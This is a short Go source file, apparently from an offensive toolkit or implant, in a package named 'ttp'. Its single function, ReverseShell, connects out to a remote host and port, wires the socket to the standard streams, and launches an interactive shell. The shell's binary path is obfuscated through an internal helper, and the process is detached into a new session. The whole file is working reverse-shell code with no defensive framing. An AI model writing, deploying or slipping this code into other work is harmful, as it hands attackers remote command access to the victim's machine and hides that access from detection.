package ttp

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"

	"core/mon/internal/obf"
)

// ReverseShell connects back to server and spawns /bin/sh with redirected stdio.
func ReverseShell(serverHost string, port int) error {
	addr := fmt.Sprintf("%s:%d", serverHost, port)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	f, err := conn.(*net.TCPConn).File()
	if err != nil {
		conn.Close()
		return fmt.Errorf("file: %w", err)
	}
	defer f.Close()
	fd := int(f.Fd())

	cmd := exec.Command(obf.D(obf.ShBin), "-i")
	cmd.Stdin = os.NewFile(uintptr(fd), "")
	cmd.Stdout = os.NewFile(uintptr(fd), "")
	cmd.Stderr = os.NewFile(uintptr(fd), "")
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	return cmd.Run()
}
